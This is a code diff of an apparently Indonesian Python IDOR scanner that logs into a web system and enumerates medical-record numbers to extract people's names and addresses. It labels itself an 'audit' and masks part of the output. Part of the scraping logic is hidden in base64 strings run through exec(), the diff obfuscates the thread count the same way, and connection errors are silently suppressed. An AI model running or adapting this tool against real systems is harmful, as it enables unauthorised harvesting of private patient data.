@@ -100,7 +100,7 @@ def fetch_data(id_num):
         if res.status_code != 200: return
 
         # Protected extraction and masking logic
-        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6Ml0udXBwZXIoKX0uLi57bmFtYVstMTpdLnVwcGVyKCl9JyBpZiBsZW4obmFtYSkgPiAzIGVsc2UgbmFtYQogICAgcHJpbnQoZidcbltcMDMzWzkybStcMDMzWzBtXSBEYXRhIGRpdGVtdWthbiBSTToqKioqKioqe2Zvcm1hdHRlZF9pZFstNDpdfSAtIHttYXNrfScp"))
+        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6Ml0udXBwZXIoKX0uLi57bmFtYVstMTpdLnVwcGVyKCl9JyBpZiBsZW4obmFtYSkgPiAzIGVsc2UgbmFtYS51cHBlcigpCiAgICBpID0gZm9ybWF0dGVkX2lkCiAgICBtID0gbGVuKGkpLy8yCiAgICBtX3JtID0gZid7aVs6Ml19eycqIyoobS0yKX17aVttXX17JyoiKihsZW4oaSktbS0yKX17aVstMV19JwogICAgcHJpbnQoZidcbltcMDMzWzkybStcMDMzWzBtXSBEYXRhIGRpdGVtdWthbiBSTTp7bV9ybX0gLSB7bWFza30nKQ=="))
 
     except Exception as e:
         pass # Diamkan error koneksi kecil agar terminal tetap bersih
@@ -219,16 +219,19 @@ def parameter_discovery_audit():
                                 with lock:
                                     if not found_event.is_set():
                                         found_event.set()
+                                        mid = len(test_id) // 2
+                                        m_rm = f"{test_id[:2]}{'*' * (mid - 2)}{test_id[mid]}{'*' * (len(test_id) - mid - 2)}{test_id[-1]}"
                                         m_name = f"{name[:2].upper()}...{name[-1:].upper()}" if len(name) > 3 else name.upper()
                                         m_addr = f"{address[:2].upper()}...{address[-1:].upper()}" if len(address) > 3 else address.upper()
                                         print(f"\n\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
+                                        print(f" [!] No. RM      : {m_rm}")
                                         print(f" [!] {_decode('TmFtYQ==')}        : {m_name}")
                                         print(f" [!] {_decode('QWxhbWF0')}      : {m_addr}")
                                         print(f" [!] {_decode('U3RhdHVz')}      : \033[91m{_decode('SURPUiBDb25maXJtZWQ=')}\033[0m")
                         except: pass
 
-                    print(f"[*] Threaded Search Started (5 Workers)...")
-                    with ThreadPoolExecutor(max_workers=5) as discovery_executor:
+                    print(f"[*] Threaded Search Started ({_decode('Mg==')} Workers)...")
+                    with ThreadPoolExecutor(max_workers=int(_decode("Mg=="))) as discovery_executor:
                         discovery_executor.map(check_id_vulnerability, search_pool)
                     
                     if not found_event.is_set():
@@ -303,7 +306,7 @@ def vulnerability_audit():
 def start_process(id_list):
     if login():
         print(f"[*] Starting Accelerated Randomized IDOR Scan for {len(id_list)} records...\n")
-        with ThreadPoolExecutor(max_workers=5) as executor:
+        with ThreadPoolExecutor(max_workers=int(_decode("Mg=="))) as executor:
             executor.map(fetch_data, id_list)
         print("\n[*] IDOR Audit Completed. Data displayed in terminal.")
 
